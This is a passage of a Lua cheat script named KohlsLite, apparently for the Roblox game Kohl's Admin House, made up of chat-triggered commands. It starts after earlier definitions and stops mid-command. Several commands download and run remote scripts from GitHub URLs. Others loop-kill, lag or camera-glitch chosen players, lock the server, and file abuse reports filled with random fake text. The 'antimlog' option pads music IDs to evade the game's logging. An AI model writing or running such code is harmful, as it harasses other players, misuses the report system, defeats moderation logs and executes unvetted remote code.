-- local personpassid = 35748 or 37127 --> NBC, BC

print("- Information -")
print("Thank you for using KohlsLite. The version you are using is v"..getgenv().klversion..". This script was created by S_P.")
Remind("Thank you for using KohlsLite. The version you are using is v"..getgenv().klversion..". This script was created by S_P.")
print("Say .kcmds to list some of the commands. DM me at ts2021x for help.")
Remind("Say .kcmds to list some of the commands. DM me at ts2021x for help.")

Chat("h \n\n\n [KohlsLite]: Executed! Version: "..getgenv().klversion.." \n\n\n") -- i finally changed it xd

print("\n\n\n")
print("- Perm check -")
if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 66254) or game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 64354) then
        perm = false 
        hasperm = true -- used
        print("A perm pad was not given - you have the Perm Admin gamepass!")
else
        perm = true
        hasperm = false -- used
        print("A perm pad was given - you don't have the Perm Admin gamepass!")
end

print("\n\n\n")
print("- Persons check -")
if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 35748) or game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 37127) then
        haspersons = true -- used!
        print("You have Person299's Admin! You have access to more features!")
else
        haspersons = false -- used!
        print("You do not have Person299's Admin!")
end

game.Players.LocalPlayer.Chatted:Connect(function(msg)
        task.wait(0)
            if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'kcmds' then
           CMDPrint()
           Remind("Check your console by running /console!")
        end

            if string.sub(msg:lower(), 1, #prefix + 2) == prefix..'iy' then -- the classic
                   GExecute("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
        end

        if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'cmdpi' then -- well, you need that visualiser, do you?
                GExecute("https://raw.githubusercontent.com/quivings/KAH/main/CMD%20v3.lua")
        end

        if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'prsc' then -- PR Script ~ atprog
                GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/People's%20Scripts/PR_Script.txt")
        end

        if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cmdy' then -- you don't need this for attaching anymore ;)
                GExecute("https://raw.githubusercontent.com/quivings/KAH/main/CMD-Y%20(v1.56).lua")
        end

        if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'myvis' then
                if haspersons == true then
                        Remind("Prefix is -")
                        GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/Main%20Scripts/MyVisualiser.lua")
                else 
                        Remind("Sorry, you need persons for this command!")
                end
        end

        if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'mydraw' then
                if haspersons == true then
                        Remind("Prefix is -")
                        GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/Main%20Scripts/MyVisualiser.lua")
                else 
                        Remind("Sorry, you need persons for this command!")
                end
        end

        if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'tricky' then -- CREDITS TO TECH
                Remind("This might not work if it's already been executed. Sorry!")
                if haspersons == true then
                        GExecute("https://raw.githubusercontent.com/Tech-187/Music-lyrics-on-time/main/Tricky%20lyrics.lua")
                else
                        GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/Other%20Scripts/Tricky%20Lyrics%20non%20persons.lua")
                end
        end

        if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'ilove' then -- CREDITS TO TECH
                Remind("This might not work if it's already been executed. Sorry!")
                if haspersons == true then
                        GExecute("https://raw.githubusercontent.com/Tech-187/Music-lyrics-on-time/main/I%20loveee.lua")
                else
                        GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/Other%20Scripts/I%20loveee%20non%20persons.lua")
                end
        end

        if string.sub(msg, 1, #prefix + 2)  == prefix..'wl' then
         local dasplayer = string.sub(msg:lower(), #prefix + 4)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if not table.find(whitelist, player) then
                        Chat("h \n\n\n [KohlsLite]: "..player.." has been whitelisted! \n\n\n")
                        Remind("Whitelisted "..player)
                        table.insert(whitelist, player)
                        Chat('unblind '..player)
                        Chat('unpunish '..player)
                else
                        Remind(player.." is already whitelisted!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 4) == prefix..'unwl' then
         local dasplayer = string.sub(msg:lower(), #prefix + 6)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(whitelist, player) then
                        Chat("h \n\n\n [KohlsLite]: "..player.." has been unwhitelisted. \n\n\n")
                        Remind("Unwhitelisted "..player)
                        table.remove(whitelist, table.find(whitelist, player))
                else
                        Remind(player.." was never whitelisted!")        
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

        if string.sub(msg, 1, #prefix + 6)  == prefix..'listwl' then
           Remind("Check your console by running /console!")
           for i = 1, #whitelist do
                  print(whitelist[i])
           end
        end

        if string.sub(msg, 1, #prefix + 8)  == prefix..'antimlog' then
                antimlog = true
        end

        if string.sub(msg, 1, #prefix + 10)  == prefix..'unantimlog' then
                antimlog = false
        end

        if string.sub(msg, 1, #prefix + 5)  == prefix..'admin' then
         local dasplayer = string.sub(msg:lower(), #prefix + 7)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if not table.find(FAdmins, player) then
                        Chat("h \n\n\n [KohlsLite]: "..player.." has been given admin! \n\n\n")
                        Remind("Admined "..player)
                        table.insert(FAdmins, player)
                else
                        Remind(player.." is already an admin!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

        if string.sub(msg, 1, #prefix + 7)  == prefix..'unadmin' then
         local dasplayer = string.sub(msg:lower(), #prefix + 9)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(FAdmins, player) then
                        Chat("h \n\n\n [KohlsLite]: "..player.." has been removed from admin. \n\n\n")
                        Remind("Unadmined "..player)
                        table.remove(FAdmins, table.find(FAdmins, player))
                else
                        Remind(player.." was never an admin!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 9)  == prefix..'listadmins' then
          Remind("Check your console by running /console!")
          for i = 1, #FAdmins do
                  print(FAdmins[i])
          end
        end

        if string.sub(msg, 1, #prefix + 6)  == prefix..'gearwl' then
         local dasplayer = string.sub(msg:lower(), #prefix + 8)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if not table.find(GWhitelisted, player) then
                        Chat("h \n\n\n [KohlsLite]: "..player.." has been whitelisted from anti-gears! \n\n\n")
                        Remind("Gear whitelisted "..player)
                               table.insert(GWhitelisted, player)
                else
                        Remind(player.." is already gear whitelisted!")        
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

        if string.sub(msg, 1, #prefix + 8)  == prefix..'ungearwl' then
         local dasplayer = string.sub(msg:lower(), #prefix + 10)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(GWhitelisted, player) then
                        Chat("h \n\n\n [KohlsLite]: "..player.." has been unwhitelisted from anti-gears. \n\n\n")
                        Remind("Un gear whitelisted "..player)
                        table.remove(GWhitelisted, table.find(GWhitelisted, player))
                else
                        Remind(player.." was never gear whitelisted!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

        if string.sub(msg, 1, #prefix + 10)  == prefix..'listgearwl' then
           Remind("Check your console by running /console!")
           for i = 1, #GWhitelisted do
                  print(GWhitelisted[i])
           end
        end

        if string.sub(msg, 1, #prefix + 6)  == prefix..'fogvis' then -- fonalc funny var
                fogdance = true
        end

        if string.sub(msg, 1, #prefix + 8)  == prefix..'unfogvis' then -- fonalc funny var
                fogdance = false
                task.wait(0.5)
                Chat("fix")
        end

        if string.sub(msg, 1, #prefix + 4)  == prefix..'ccol' then
                Chat("fogend 0")
                ccolours = true
        end

        if string.sub(msg, 1, #prefix + 6)  == prefix..'unccol' then
                ccolours = false
                task.wait(0.5)
                Chat("fix")
        end

       if string.sub(msg, 1, #prefix + 8) == prefix..'loopkill' then
         local dasplayer = string.sub(msg:lower(), #prefix + 10)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if not table.find(loopkill, player) then
                        Chat("h \n\n\n [KohlsLite]: "..player.." is being loopkilled. \n\n\n")
                        Remind("Loopkilling "..player)
                        table.insert(loopkill, player)
                else
                        Remind(player.." is already being loopkilled!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 10) == prefix..'unloopkill' then
         local dasplayer = string.sub(msg:lower(), #prefix + 12)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(loopkill, player) then
                               Chat("h \n\n\n [KohlsLite]: "..player.." is no longer being loopkilled! \n\n\n")
                        Remind("Unloopkilling "..player)
                        table.remove(loopkill, table.find(loopkill, player))
                else
                        Remind(player.." was never loopkilled!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

   if string.sub(msg, 1, #prefix + 5) == prefix..'names' then
         local dasplayer = string.sub(msg:lower(), #prefix + 7)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if not table.find(byecam, player) then
                        Chat("h \n\n\n [KohlsLite]: "..player.."'s camera is being glitched! Boo! \n\n\n")
                        Remind("Spam naming "..player)
                        table.insert(byecam, player)
                else
                        Remind(player.." is already being spam named!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 7) == prefix..'unnames' then
         local dasplayer = string.sub(msg:lower(), #prefix + 9)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(byecam, player) then
                               Chat("h \n\n\n [KohlsLite]: "..player.."'s camera is no longer being glitched! Yipee! \n\n\n")
                        Remind("Unspam naming "..player)
                        table.remove(byecam, table.find(byecam, player))
                else
                        Remind(player.." was never spam named!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

   if string.sub(msg, 1, #prefix + 6) == prefix..'lagged' then
         local dasplayer = string.sub(msg:lower(), #prefix + 8)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if not table.find(carcar, player) then
                        Chat("h \n\n\n [KohlsLite]: "..player.." loves cars! Yummy! \n\n\n")
                        Remind("Spam car-ing "..player)
                        table.insert(carcar, player)
                else
                        Remind(player.." is already being spam carred!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 8) == prefix..'unlagged' then
         local dasplayer = string.sub(msg:lower(), #prefix + 10)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(carcar, player) then
                               Chat("h \n\n\n [KohlsLite]: "..player.."'s hates cars! Noooooo \n\n\n")
                        Remind("Unspam car-ing "..player)
                        table.remove(carcar, table.find(carcar, player))
                else
                        Remind(player.." was never spam carred!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 6) == prefix..'report' then
         local dasplayer = string.sub(msg:lower(), #prefix + 8)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                        Remind("Reported "..player.."! Note that reporting doesn't work on some executors")
                        game.Players:ReportAbuse(game:GetService("Players"),player,"Cheating/Exploiting", "Spamming random stuff " .. math.random(1, 3276700))         
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 2) == prefix..'bl' then
         local dasplayer = string.sub(msg:lower(), #prefix + 4)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if not table.find(blacklist, player) then
                        Chat("h \n\n\n [KohlsLite]: "..player.." has been blacklisted. \n\n\n");Regen()
                        Remind("Blacklisted "..player)
                        table.insert(blacklist, player)
                else
                        Remind(player.." is already blacklisted!")        
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

        if string.sub(msg, 1, #prefix + 4) == prefix..'unbl' then
         local dasplayer = string.sub(msg:lower(), #prefix + 6)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(blacklist, player) then
                        Chat("h \n\n\n [KohlsLite]: "..player.." has been unblacklisted! \n\n\n")
                        table.remove(blacklist, table.find(blacklist, player))
                        Remind("Unblacklisted "..player)
                               Chat('unblind '..player)
                        Chat('unpunish '..player)
                else
                        Remind(player.." was never blacklisted!")        
                end

         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

      if string.sub(msg, 1, #prefix + 9) == prefix..'checkperm' then
         local dasplayer = string.sub(msg:lower(), #prefix + 11)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                gcplr = cplr
                  gcplrn = player
                checkforperm()
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 10) == prefix..'fcheckperm' then -- yummy bypass mmmm
          Chat("reset all")
          Regen()
          task.wait(1)
          checkperm2 = true
          Chat("ff admins")
          task.wait(2)
          checkperm2 = false
          Chat("unff admins")
       end

       if string.sub(msg, 1, #prefix + 12) == prefix..'checkpersons' then
         local dasplayer = string.sub(msg:lower(), #prefix + 14)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                gcplr = cplr
                  gcplrn = player
                checkforpersons()
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
        end

      if string.sub(msg, 1, #prefix + 8) == prefix..'checkgps' then
         local dasplayer = string.sub(msg:lower(), #prefix + 10)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                gcplr = cplr
                  gcplrn = player
                checkforperm()
                checkforpersons()
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

        if string.sub(msg, 1, #prefix + 6)  == prefix..'listbl' then
           Remind("Check your console by running /console!")
           for i = 1, #blacklist do
                  print(blacklist[i])
           end
        end

        if string.sub(msg, 1, #prefix + 9)  == prefix..'permusers' then
           Remind("Check your console by running /console!")
           for i = 1, #permusers do
                  print(permusers[i])
           end
        end

        if string.sub(msg, 1, #prefix + 12)  == prefix..'personsusers' then
           Remind("Check your console by running /console!")
           for i = 1, #personsusers do
                  print(personsusers[i])
           end
        end

       if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'adminjoy' then
                game.Players.LocalPlayer:Kick("you: 'i use adminjoy trash!' Anyways, ask ME to add the colourful seizure crap, don't use THAT!")
       end

       if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'slock' then
        Chat("h \n\n\n [KohlsLite]: Server is locked! \n\n\n");Regen()
        slockenabled = true
       end

       if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unslock' then
        slockenabled = false
        Chat("h \n\n\n [KohlsLite]: Server is unlocked! \n\n\n")
        Chat('unblind all')
        Chat('unpunish all')
       end

       if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'newplrslock' then
          newplrautoslock = true
       end

       if string.sub(msg:lower(), 1, #prefix + 13) == prefix..'unnewplrslock' then
          newplrautoslock = false
       end

       if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'autoblvgc' then
                Remind("Auto blacklisting users using the VG!")
                autoblvgc = true
       end

       if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unautoblvgc' then
                Remind("No longer auto blacklisting users using the VG!")
                  autoblvgc = false
       end

        if string.sub(msg, 1, #prefix + 7)  == prefix..'npslist' then
           Remind("Check your console by running /console!")
           for i = 1, #newplrslocked do
                  print(newplrslocked[i])
           end
        end

      if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'plrnewlen' then
                newlen = tonumber(string.sub(msg:lower(), #prefix + 11))
                Remind("Set age restrictions to "..newlen.." days!")
      end

      if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'pboombox' then
            Chat("gear me 212641536")
            task.wait(0.5)
            local check = string.sub(msg:lower(), #prefix + 10, #prefix + 10)
	    if check == "g" then
			local idrinkrum = string.sub(msg, #prefix + 11) ; task.wait(0)
			myplay = musictable[idrinkrum].id
	    else
			myplay = string.sub(msg:lower(), 10 + #prefix)
	    end
            repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("SuperFlyGoldBoombox")
            local bom = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
            bom.Parent = game.Players.LocalPlayer.Character                                   
            task.wait(0.25)
	    bom.Remote:FireServer("PlaySong", tonumber(myplay))
      end

      if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'mboombox' then
            Chat("gear me 212641536")
            task.wait(0.5)
            local check = string.sub(msg:lower(), #prefix + 10, #prefix + 10)
	    if check == "g" then
			local idrinkrum = string.sub(msg, #prefix + 11) ; task.wait(0)
			myplay = musictable[idrinkrum].id
	    else
			myplay = string.sub(msg:lower(), 10 + #prefix)
	    end
            repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("SuperFlyGoldBoombox")
            local bom = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
            bom.Parent = game.Players.LocalPlayer.Character                                   
            task.wait(0.25)
	    bom.Remote:FireServer("PlaySong", tonumber(myplay))
	    function rng() 
                	return math.random(-128, 128)
            end
            bom.GripPos = Vector3.new(rng(), 1, rng())
      end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'lgmusic' then
        ieatkids = string.sub(msg, #prefix + 8)
        if workspace.Terrain["_Game"].Folder:FindFirstChild("localsound") then
                        lsound:Stop()
                        lsound:Destroy()
        end
        lsound = Instance.new("Sound", workspace.Terrain["_Game"].Folder)
        lsound.Name = "localsound"
        lsound.SoundId = "rbxassetid://"..musictable[ieatkids].id
        lsound:Play()        
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unlgmusic' then
              if workspace.Terrain["_Game"].Folder:FindFirstChild("localsound") then
                        lsound:Stop()
                        lsound:Destroy()
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'msay' then
        musicsay = true
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'unmsay' then
        musicsay = false
    end                

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'gmusic' then
        musicplay = string.sub(msg, #prefix + 7)
        if musicsay == true then
           Chat("h \n\n\n [KohlsLite]: Playing music: ".. musictable[musicplay].name ..". \n\n\n")
        end
        if antimlog then
            Chat("music 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" .. musictable[musicplay].id)
        else
            Chat("music " .. musictable[musicplay].id)
        end;musicplay = tonumber(musicplay)
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'rgmusic' then
        local length = 0
        for _ in pairs(musictable) do
                    length = length + 1
        end
        local randomindex = math.random(1, length)
        local rizz = tostring(randomindex)
         if musicsay == true then
                    Chat("h \n\n\n [KohlsLite]: Playing music: " .. musictable[rizz].name .. ". \n\n\n")
         end
         if antimlog then
                    Chat("music 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" .. musictable[rizz].id)
         else
                Chat("music " ..musictable[rizz].id)
         end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'nmusic' then -- if it double executes ... you
            if ratelj then print("anti double execution worked!") return end
            ratelj = true

            local length = 0
            for _ in pairs(musictable) do
                length = length + 1
            end

           if musicplay == nil or musicplay == length then
                        musicplay = 1
            else
                        musicplay = musicplay + 1
            end

            local mast = tostring(musicplay)

            if musicsay == true then
                Chat("h \n\n\n [KohlsLite]: Playing music: " .. musictable[mast].name .. ". \n\n\n")
            end

            if antimlog then
                Chat("music 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" .. musictable[mast].id)
           else
                Chat("music " .. musictable[mast].id)
           end; ratelj = false
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'pmusic' then -- if it double executes ... you
            if ratelj then print("anti double execution worked!") return end
            ratelj = true

            local length = 0
            for _ in pairs(musictable) do
                length = length + 1
            end

           if musicplay == nil or musicplay == 1 then
                        musicplay = length
            else
                        musicplay = musicplay - 1
            end

            local mast = tostring(musicplay)

            if musicsay == true then
                Chat("h \n\n\n [KohlsLite]: Playing music: " .. musictable[mast].name .. ". \n\n\n")
            end

            if antimlog then
                Chat("music 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" .. musictable[mast].id)
           else
                Chat("music " .. musictable[mast].id)
           end; ratelj = false
    end

    if string.sub(msg, 1, #prefix + 9)  == prefix..'musiclist' then
         Remind("Check your console by running /console!")
             local length = 0
             for _ in pairs(musictable) do
                length = length + 1
             end
         for i = 1, length do
                 q = tostring(i)
                  print("gmusic"..i.." - "..musictable[q].id.." - "..musictable[q].name)
         end
    end

    if string.sub(msg, 1, #prefix + 8)  == prefix..'gearlist' then
         Remind("Check your console by running /console!")
         local sortedGearNames = {}
         for gearname, _ in pairs(gearlist) do
                    table.insert(sortedGearNames, gearname)
         end
         table.sort(sortedGearNames)
         for _, gearname in ipairs(sortedGearNames) do
                     local gearid = gearlist[gearname].gearid
                     if type(gearid) == "table" then
                        gearid = table.concat(gearid, ", ")
                     end
                    print(gearname .. " - IDS: " .. gearid)
         end
    end

    if string.sub(msg, 1, #prefix + 8)  == prefix..'charlist' then
         Remind("Check your console by running /console!")
         local sortedNames = {}
         for charname, _ in pairs(charlist) do
                    table.insert(sortedNames, charname)
         end
         table.sort(sortedNames)
         for _, charname in ipairs(sortedNames) do
                    print(charname .. " - IDS: " .. charlist[charname].charid)
         end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'pausem' then
       for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Folder:GetDescendants()) do
                  if v:IsA("Sound") and v.Playing then
                           v.Playing = false
                    end
       end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'playm' then
              for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Folder:GetDescendants()) do
                    if v:IsA("Sound") and not v.Playing then
                           v.Playing = true
                  end
              end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'stopm' then
        for i, v in pairs(game:GetService("Workspace").Terrain["_Game"].Folder:GetDescendants()) do
                if v:IsA("Sound") then
                    v:Stop()
                end
        end   
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'startm' then
        for i, v in pairs(game:GetService("Workspace").Terrain["_Game"].Folder:GetDescendants()) do
                if v:IsA("Sound") then
                    v:Play()
                end
        end   
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'deiv' then -- ported from simplekah
			gjdelock = false
                        Chat("h \n\n\n [KohlsLite]: Domain Expansion: Infinity Void \n\n\n")
                        local gjdeivfgend = 2000
                        local gjdeivrfgcl = 255
                        local gjdeivgfgcl = 255
                        local gjdeivbfgcl = 255
                        time = 7
                        for i = 1,100 do
                            task.wait(0.1)
                            gjdeivfgend = gjdeivfgend - 19
                            gjdeivrfgcl = gjdeivrfgcl - 2.55
                            gjdeivgfgcl = gjdeivgfgcl - 2.55
                            gjdeivbfgcl = gjdeivbfgcl - 2.55
                            time = time - 0.01
                            Chat("fogend " .. gjdeivfgend)
                            Chat("fogcolor " .. gjdeivrfgcl .. " " .. gjdeivgfgcl .. " " .. gjdeivbfgcl)
                            Chat("time " .. time)
			    if gjdelock == "stop" then
					return 
			    end
                        end
			if gjdelock ~= "stop" then
                        	gjdelock = true
                        	Chat("h \n\n\n [KohlsLite]: You have entered my domain so please wait until I decide to close it... \n\n\n")
			end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'undeiv' then  -- ported from simplekah
                        Chat("fix")
                        Chat("reload all")
                        gjdelock = "stop"
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'tropics' then  -- ported from simplekah
                     local gjpfgend = 0
                     local gjbpfgcl = 0
                     local gjgpfgcl = 0
                     local gjrpfgcl = 200
                     local time = 10
                     Chat("h \n\n\n [KohlsLite]: Red glow... \n\n\n")
                     Chat("fogcolor 200 0 0")
                     Chat("outdoorambient 0 0 0")
                     Chat("time " .. time)
                     for i = 1,10 do
                            task.wait(0.2)
                            gjpfgend = gjpfgend + 100
                            Chat("fogend " .. gjpfgend)
                     end
                     Chat("h \n\n\n [KohlsLite]: Blue glow... \n\n\n")
                     for i = 1,10 do
                            task.wait(0.3)
                            time = time - 0.4
                            Chat("time " .. time)
                            gjpfgend = gjpfgend - 50
                            Chat("fogend " .. gjpfgend)
                            gjbpfgcl = gjbpfgcl + 20
                            Chat("fogcolor " .. "200 " .. "0 " .. gjbpfgcl)
                     end
                     Chat("h \n\n\n [KohlsLite]: Hollow purple! \n\n\n")
                        Chat("speed others inf")
                     for i = 1,10 do
                            task.wait(0.2)
                            gjrpfgcl = gjrpfgcl + 5.5
                            gjbpfgcl = gjbpfgcl + 5.5
                            gjgpfgcl = gjgpfgcl + 25.5
                            gjpfgend = gjpfgend + 150
                            time = time + 0.1
                            Chat("fogcolor " .. gjrpfgcl .. " " .. gjgpfgcl .. " " .. gjbpfgcl)
                            Chat("fogend " .. gjpfgend)
                            Chat("time " .. time)
                    end
                    Chat("fix")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'sclr' then
                Chat("fix")
                Chat("clr")
                Chat("removeclones")
                Chat("removejails")
		Chat(prefix.."fixpaint")
		Chat("unpaint all")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'volm' then -- rap e
               local newVolume = tonumber(string.sub(msg:lower(), #prefix + 6))
               if newVolume ~= nil and game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                          game:GetService("Workspace").Terrain["_Game"].Folder.Sound.Volume = newVolume
               end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'musicid' then
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                              print("Current music ID: "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.SoundId)
                              Remind("Current music ID: "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.SoundId)
              end
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'cmusicid' then
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                                local url = game:GetService("Workspace").Terrain["_Game"].Folder.Sound.SoundId
                                local number = url:match("id=(%d+)")
                                setclipboard(number)
              end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cvol' then
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                              Remind("Current volume: "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.Volume)
              end        
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'timepos' then
              local tplace = tonumber(string.sub(msg:lower(), #prefix + 9))
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                        game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimePosition = tplace 
              end        
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'timeis' then
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                        Remind("Current time position: "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimePosition)
              end        
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'timedur' then
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                        Remind("Time length: "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimeLength)
              end        
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'timeps' then
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                        Remind("The playback speed is: "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackSpeed)
              end        
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'timeplay' then
             newPlaybackSpeed = tonumber(string.sub(msg:lower(), #prefix + 10))
             local Sound = game:GetService("Workspace").Terrain["_Game"].Folder.Sound
             Sound.PlaybackSpeed = newPlaybackSpeed
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'audiolol' then
       audiotroll = true
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unaudiolol' then
       audiotroll = false
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antimusic' then
       mymusiconly = false
       antimusic = true
	Remind("Anti music is on! Do 'pmu (NO ID AFTER IT!!)' if this command doesn't work well")
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantimusic' then
       antimusic = false
	Remind("Turned anti music off!")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'pmu' then
        musicoff = false
        mymusiconly = true
        gottenmode = 2
        mymusiconlyid = tonumber(string.sub(msg:lower(), #prefix + 11))
        Remind("Perm music is on")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'2pmu' then
        if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                                local url = game:GetService("Workspace").Terrain["_Game"].Folder.Sound.SoundId
                                local number = url:match("id=(%d+)")
                                gottenmode = 1
                                musicoff = false
                                mymusiconly = true
                                mymusiconlyid = number
                                Remind("Perm music is on (set to current id)")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'bring' then
        bringu = (string.sub(msg:lower(), #prefix + 7))
        Bring()
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'goto' then
        gotou = (string.sub(msg:lower(), #prefix + 6))
        Goto()
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'theme' then
                    local themeNumber = tonumber(string.sub(msg:lower(), #prefix + 6))
                    if themeNumber and themecode[themeNumber] then
                        Chat("fix")
                        local codeParts = {}
                        for code in themecode[themeNumber].code:gmatch("[^,]+") do
                                    table.insert(codeParts, code)
                        end
                            for i, v in ipairs(codeParts) do
                                    Chat(v)
                            end

                    else
                        Remind("Invalid theme number.")
                    end
    end

   if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'turn' then
            local args = string.split(msg, " ")
